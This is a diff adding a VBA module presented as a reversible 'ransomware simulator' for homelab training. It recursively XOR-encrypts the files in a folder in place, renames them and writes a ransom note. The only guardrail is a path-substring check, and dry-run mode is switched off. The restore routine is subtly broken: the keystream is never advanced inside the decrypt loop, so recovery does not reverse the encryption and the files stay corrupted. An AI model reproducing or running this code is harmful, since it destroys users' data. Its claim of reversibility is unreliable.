@@ -1,0 +1,176 @@
+Option Explicit
+' ============================================================
+'  RANSOMWARE SIMULATOR  -  HOMELAB / TRAINING ONLY
+'  Reversible. Guardrailed. Do NOT run outside an isolated VM.
+' ============================================================
+
+Private Const SIM_KEY      As String = "HomelabSimKey2026!"
+Private Const NOTE_NAME    As String = "_RANSOM_SIM_NOTE.txt"
+Private Const LOCK_EXT     As String = ".simlock"
+Private Const SAFE_MARKER  As String = "RansomSimLab"   ' path must contain this
+Private Const DRY_RUN      As Boolean = False            ' set False to really run
+
+' ---- Entry points -------------------------------------------------
+Sub RunRansomSim()
+    SimRoot Environ$("USERPROFILE") & "\RansomSimLab"
+End Sub
+
+Sub SimRoot(ByVal root As String)
+    Dim fso As Object, n As Long
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    ' --- Hard guardrail: refuse anything outside the sandbox ---
+    If InStr(1, root, SAFE_MARKER, vbTextCompare) = 0 Then
+        MsgBox "REFUSED: '" & root & "' is not inside the '" & SAFE_MARKER & "' sandbox."
+        Exit Sub
+    End If
+    If Not fso.FolderExists(root) Then
+        MsgBox "Sandbox not found: " & root
+        Exit Sub
+    End If
+
+    Randomize
+    n = WalkEncrypt(fso, root)
+    WriteNote fso, root
+
+    MsgBox IIf(DRY_RUN, "[DRY-RUN] would encrypt ", "Encrypted ") & _
+           n & " file(s) under " & root
+End Sub
+
+' ---- Recursive walk ----------------------------------------------
+Private Function WalkEncrypt(fso As Object, ByVal folderPath As String) As Long
+    Dim f As Object, sf As Object, n As Long
+    For Each f In fso.GetFolder(folderPath).Files
+        If ShouldEncrypt(fso, f.Name) Then
+            If EncryptOne(fso, f) Then n = n + 1
+        End If
+    Next
+    For Each sf In fso.GetFolder(folderPath).SubFolders
+        n = n + WalkEncrypt(fso, sf.Path)
+    Next
+    WalkEncrypt = n
+End Function
+
+Private Function ShouldEncrypt(fso As Object, ByVal fname As String) As Boolean
+    Dim ext As String
+    ext = LCase$(fso.GetExtensionName(fname))
+    If ext = LCase$(Replace(LOCK_EXT, ".", "")) Then Exit Function   ' already locked
+    If LCase$(fname) = LCase$(NOTE_NAME) Then Exit Function
+    If LCase$(fname) = "sim_ransom.bas" Then Exit Function
+    ShouldEncrypt = True
+End Function
+
+' ---- Per-file XOR stream -----------------------------------------
+Private Function EncryptOne(fso As Object, f As Object) As Boolean
+    If DRY_RUN Then EncryptOne = True: Exit Function
+    If f.Size = 0 Then Exit Function
+
+    Dim ff As Integer, data() As Byte, i As Long, iv As Long
+    Dim r As Double, k As Long, keyLen As Long
+
+    ff = FreeFile
+    Open f.Path For Binary Access Read As #ff
+    ReDim data(0 To f.Size - 1)
+    Get #ff, , data
+    Close #ff
+
+    iv = Int(Rnd() * 65536)                 ' per-file seed (16-bit)
+    keyLen = Len(SIM_KEY)
+    r = iv
+    For i = 0 To UBound(data)
+        r = r * 25173# + 13849#
+        r = r - Int(r / 65536#) * 65536#  ' keep in 16-bit to avoid overflow
+        k = Asc(Mid$(SIM_KEY, (i Mod keyLen) + 1, 1)) Xor (r And &HFF)
+        data(i) = data(i) Xor k
+    Next
+
+    ff = FreeFile
+    Debug.Print "Trying to write: " & f.Path
+    Open f.Path For Binary Access Write As #ff
+    Put #ff, , data
+    Dim lo As Byte, hi As Byte
+    lo = iv And &HFF
+    hi = (iv \ 256) And &HFF
+    Put #ff, , lo                            ' seed trailer so decrypt can re-sync
+    Put #ff, , hi
+    Close #ff
+
+    fso.MoveFile f.Path, f.Path & LOCK_EXT
+    EncryptOne = True
+End Function
+
+' ---- Ransom note --------------------------------------------------
+Private Sub WriteNote(fso As Object, ByVal root As String)
+    Dim ts As Object
+    Set ts = fso.CreateTextFile(root & "\" & NOTE_NAME, True)
+    ts.WriteLine "*** RANSOMWARE SIMULATION - NOT A REAL ATTACK ***"
+    ts.WriteLine "This file was produced by an authorized homelab exercise."
+    ts.WriteLine "Run RestoreAllFiles in SIM_RANSOM.bas to recover your data."
+    ts.Close
+End Sub
+
+Sub RestoreAllFiles()
+    RestoreRoot Environ$("USERPROFILE") & "\RansomSimLab"
+End Sub
+
+Sub RestoreRoot(ByVal root As String)
+    Dim fso As Object, n As Long
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If InStr(1, root, SAFE_MARKER, vbTextCompare) = 0 Then
+        MsgBox "REFUSED: outside sandbox."
+        Exit Sub
+    End If
+    If Not fso.FolderExists(root) Then Exit Sub
+    n = WalkDecrypt(fso, root)
+    MsgBox "Restored " & n & " file(s)."
+End Sub
+
+Private Function WalkDecrypt(fso As Object, ByVal folderPath As String) As Long
+    Dim f As Object, sf As Object, n As Long
+    For Each f In fso.GetFolder(folderPath).Files
+        If LCase$(Right$(f.Name, Len(LOCK_EXT))) = LCase$(LOCK_EXT) Then
+            If DecryptOne(fso, f) Then n = n + 1
+        End If
+    Next
+    For Each sf In fso.GetFolder(folderPath).SubFolders
+        n = n + WalkDecrypt(fso, sf.Path)
+    Next
+    WalkDecrypt = n
+End Function
+
+Private Function DecryptOne(fso As Object, f As Object) As Boolean
+    Dim ff As Integer, data() As Byte, i As Long, iv As Long, total As Long
+    Dim r As Double, k As Long, keyLen As Long
+
+    ff = FreeFile
+    Open f.Path For Binary Access Read As #ff
+    total = LOF(ff)
+    If total < 3 Then Close #ff: Exit Function
+    ReDim data(0 To total - 1)
+    Get #ff, , data
+    Close #ff
+
+    iv = CLng(data(total - 2)) + (CLng(data(total - 1)) * 256&)      ' read 16-bit seed
+    total = total - 2                                  ' strip trailer
+
+    keyLen = Len(SIM_KEY)
+    r = iv
+    For i = 0 To total - 1
+
+        k = Asc(Mid$(SIM_KEY, (i Mod keyLen) + 1, 1)) Xor (r And &HFF)
+        data(i) = data(i) Xor k
+    Next
+
+    Dim out() As Byte
+    ReDim out(0 To total - 1)
+    For i = 0 To total - 1: out(i) = data(i): Next
+    r = r * 25173# + 13849#
+    r = r - Int(r / 65536#) * 65536#
+    ff = FreeFile
+    Open f.Path For Binary Access Write As #ff
+    Put #ff, , out
+    Close #ff
+
+    fso.MoveFile f.Path, Left$(f.Path, Len(f.Path) - Len(LOCK_EXT))
+    DecryptOne = True
+End Function
